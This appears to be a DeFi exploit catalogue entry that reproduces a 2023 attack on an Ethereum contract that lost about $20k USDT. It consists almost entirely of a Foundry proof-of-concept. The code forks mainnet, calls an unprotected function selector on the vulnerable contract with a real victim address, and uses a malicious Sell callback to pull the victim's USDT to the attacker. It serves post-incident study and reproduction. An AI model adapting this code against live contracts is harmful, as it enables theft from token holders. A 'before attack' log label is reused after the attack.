# [?] Contract_0x7657 - Business Logic

## Summary
Severity: Unknown
Chain: Ethereum
Component: Contract_0x7657
Published: 2023-06-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/Contract_0x7657_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$20k $USDT

```solidity
contract ContractTest is Test {
    IUSDTinterface USDT = IUSDTinterface(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address Contract_addr = 0x76577603F99EAe8320F70B410a350a83D744CB77;
    address Victim = 0x637b935CbA030Aeb876eae07Aa7FF637166de4D6;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_511_178 - 1);
        vm.label(address(USDT), "USDT");
        vm.label(address(Contract_addr), "Contract_addr");
        vm.label(address(Victim), "Victim");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker USDT balance before attack", USDT.balanceOf(address(this)), 6);
        uint256 Victim_balance = USDT.balanceOf(address(Victim));
        (bool success, bytes memory data) =
            Contract_addr.call(abi.encodeWithSelector(bytes4(0x0a8fe064), address(this), Victim, 0, Victim_balance, 1));
        emit log_named_decimal_uint("Attacker USDT balance before attack", USDT.balanceOf(address(this)), 6);
    }

    function Sell(uint256 _snipeID, uint256 _sellPercentage) external payable returns (bool) {
        address(USDT).call(abi.encodeWithSelector(bytes4(0x23b872dd), Contract_addr, address(this), _snipeID));
        return false;
    }

    fallback() external payable {}
    receive() external payable {}
}
```
